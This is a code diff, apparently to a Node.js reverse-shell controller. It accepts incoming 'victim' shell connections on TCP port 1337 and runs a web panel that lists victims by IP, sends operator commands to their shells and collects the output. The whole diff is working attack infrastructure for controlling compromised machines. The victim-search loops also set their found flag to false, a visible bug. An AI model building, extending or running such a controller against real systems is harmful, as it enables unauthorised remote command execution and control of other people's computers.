@@ -16,11 +16,18 @@ nunjucks.configure('views', {
 var tcpPort = 1337;
 var victims = [];
 var commandLine = '';
+var previousCommandLine = '';
+var timesReloadedSuccesfully = 0;
 
 // Function passed as parameter is executed for every new connection
 net.createServer(function(sock) {
     console.log('%s Victim %s connected', date.format(), sock.remoteAddress );
 
+    // Event listener for receiving data
+    sock.on('data', function(data){
+        commandLine += data;
+        console.log('%s Victim %s responded:\n%s', date.format(), sock.remoteAddress, data);
+    })
     // Event listeners for end of connection
     sock.on('close', function() {
         victims.splice(victims.indexOf(sock), 1);
@@ -31,38 +38,23 @@ net.createServer(function(sock) {
         console.log('%s Victim %s disconnected because of error: %s', date.format(), remoteAddress, err.message);  
     });
 
-    // Event listener for initial messages in case there is one
-    sock.on('data', function(data){
-        console.log('%s Victim sent first message %s', date.format(), data);
-    });
-
-    victims.push({socket: sock, initialized: false});
+    victims.push(sock);
 }).listen(tcpPort, '0.0.0.0');
 
-// Remove possible event listener for receiving first messages
-function initializeCommandLine(victim){
-    commandLine = '';
-    victim.socket.removeAllListeners('data');
-    victim.initialized = true;
-}
-
-// Wrapper for waiting asynchronously
-function waitForResponse(socket) {
+// Wrapper for waiting for the first response
+function waitForResponse(sock) {
     return new Promise((resolve) => {           // Promise to resolve in the future
-        socket.once('data', function(data) {    // Note that we register the event listener once, otherwise, it would apply every time there is a response
-            commandLine += data + '\n';
-            console.log('%s Victim %s responded:\n%s', date.format(), socket.remoteAddress, data);
+        sock.once('data', function(data) {
             resolve(true);
         });
-        socket.once('close', function() {
+        sock.once('close', function() {
             resolve(false);
         });
-        socket.once('error', function (err) {
+        sock.once('error', function (err) {
             resolve(false);
         });
     });
 }
-
 
 /******************* Web application server ********************/
 
@@ -71,15 +63,16 @@ app.get('/', function (req, res) {
         res.render('index.html');
     }
     else{
+        commandLine = '';
         res.render('hub.html', { victims });
     }
 })
 
 app.get('/:ip', function (req, res) {
-    let i = 0, found = false, victim;
+    let i = 0, found = false, end = false, victim;
 
     while (i < victims.length && !found){
-        if (victims[i].socket.remoteAddress === req.params.ip){
+        if (victims[i].remoteAddress === req.params.ip){
             victim = victims[i];
             found = false;
         }
@@ -89,8 +82,21 @@ app.get('/:ip', function (req, res) {
         res.redirect(303, '/');
     }
     else{
-        initializeCommandLine(victim);
-        res.render('victim.html', { victim, commandLine });
+        // If there is nothing new to display on commandLine, increment timesReloaldedSuccesfully, 
+        // else, reset the counter and reload the page (end = false). When the commandLine hasn't 
+        // been changed 5 times, stop reloading the page (end = true)
+        // This is done to get the most responses when shell splits one response in many ones (ie. PowerShell)
+        if (previousCommandLine == commandLine){
+            timesReloadedSuccesfully++;
+        }
+        else{
+            timesReloadedSuccesfully = 0;
+            previousCommandLine = commandLine;
+        }
+        if (timesReloadedSuccesfully > 5){
+            end = true;
+        }
+        res.render('victim.html', { victim, commandLine, end});
     }
 })
 
@@ -98,27 +104,22 @@ app.post('/:ip', function (req, res) {
     let i = 0, found = false, victim;
 
     while (i < victims.length && !found){
-        if (victims[i].socket.remoteAddress === req.params.ip){
+        if (victims[i].remoteAddress === req.params.ip){
             victim = victims[i];
             found = false;
         }
         i++;
     }
-    if (!victim || !victim.initialized){
+    if (!victim){
         res.redirect(303, '/');
     }
     else{
-        victim.socket.write(req.body.command + "\n");
-        commandLine += " > " + req.body.command + "\n";
+        timesReloadedSuccesfully = 0;
+        previousCommandLine = '';
+        victim.write(req.body.command + "\n");
         console.log("%s User sent command: %s", date.format(), req.body.command);
-        waitForResponse(victim.socket).then(successful => { // If victim really responds or if it closes the socket
-            if (successful){
-                res.render('victim.html', { victim, commandLine});
-            }
-            else{
-                res.redirect(303, '/');
-            }
-        });
+        waitForResponse(victim);
+        res.render('victim.html', { victim, commandLine, end: false});
     }
 })
 
@@ -126,8 +127,8 @@ app.post('/:ip/disconnect', function(req, res){
     let i = 0, found = false;
 
     while (i < victims.length && !found){
-        if (victims[i].socket.remoteAddress === req.params.ip){
-            victims[i].socket.destroy();
+        if (victims[i].remoteAddress === req.params.ip){
+            victims[i].destroy();
             found = true;
             console.log("%s Connection ended", date.format());
         }
